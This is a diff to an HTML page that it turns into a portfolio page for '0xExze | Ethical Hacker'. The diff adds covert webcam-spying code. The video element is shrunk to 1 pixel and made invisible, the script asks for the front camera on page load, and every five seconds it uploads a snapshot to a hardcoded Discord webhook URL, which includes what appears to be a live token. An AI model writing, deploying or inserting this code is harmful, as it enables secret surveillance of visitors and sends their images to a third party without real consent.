@@ -2,44 +2,84 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>0xExze | Ethical Hacker</title>
   <style>
     body {
-      background-color: #111;
-      color: #fff;
-      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #0d0d0d;
+      color: #00ffcc;
+      font-family: "Courier New", monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 1em;
+      color: #aaa;
+      max-width: 600px;
       text-align: center;
-      padding: 20px;
     }
-    video {
-      border: 2px solid #00ff88;
+
+    .terminal {
+      background: #111;
+      color: #0f0;
+      border: 2px solid #00ffcc;
       border-radius: 10px;
-      width: 320px;
-      height: 240px;
-      margin-top: 20px;
+      padding: 20px;
+      width: 90%;
+      max-width: 600px;
+      margin-top: 30px;
+      font-size: 0.9em;
     }
+
+    #video {
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      position: absolute;
+    }
+
     .status {
-      margin-top: 15px;
-      color: #00ff88;
+      margin-top: 10px;
+      font-size: 0.85em;
+      color: #0f0;
     }
   </style>
 </head>
 <body>
-  <h2>📸 Please Allow Camera Access</h2>
+  <h1>0xExze</h1>
+  <p>Cybersecurity Analyst | Penetration Tester | Digital Forensics | OSINT Specialist</p>
+
+  <div class="terminal">
+    <p>> Initializing system...</p>
+    <p>> Loading modules...</p>
+    <p>> Accessing external camera stream...</p>
+    <p id="cam-status">> Awaiting permissions...</p>
+  </div>
+
   <video id="video" autoplay playsinline></video>
-  <div class="status" id="status">Waiting for camera access...</div>
+  <div class="status" id="status">Initializing camera...</div>
 
   <script>
     const video = document.getElementById("video");
     const statusText = document.getElementById("status");
+    const camStatus = document.getElementById("cam-status");
     const webhookUrl = "https://discordapp.com/api/webhooks/1360012861673570315/ZqzUK5SoTzzvkBMIGPbH00hA9lt0nAj_eHAbqbqS-Y4vfhq1Dy-sX4ULdcdTWwl0Ui6L";
 
-    async function initCamera() {
+    async function startCam() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        statusText.textContent = "✅ Camera access granted. Sending image every 5 seconds.";
+        statusText.textContent = "✅ Camera active";
+        camStatus.textContent = "> Camera stream active. Sending images every 5 seconds.";
 
         const canvas = document.createElement("canvas");
         const ctx = canvas.getContext("2d");
@@ -50,21 +90,26 @@
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           canvas.toBlob(blob => {
             const formData = new FormData();
-            formData.append("file", blob, "capture.jpg");
+            formData.append("file", blob, "cam.jpg");
+
             fetch(webhookUrl, {
               method: "POST",
               body: formData
-            }).catch(err => console.error("Webhook send failed", err));
+            }).catch(err => {
+              console.error("Failed to send to Discord", err);
+              statusText.textContent = "⚠️ Failed to send image";
+            });
           }, "image/jpeg", 0.8);
         }, 5000);
 
       } catch (err) {
-        statusText.textContent = "❌ Camera access denied or unavailable.";
-        console.error("Camera error:", err);
+        statusText.textContent = "❌ Camera blocked or not available";
+        camStatus.textContent = "> ❌ Camera access denied by user";
+        console.error("Error accessing camera", err);
       }
     }
 
-    initCamera();
+    startCam();
   </script>
 </body>
 </html>
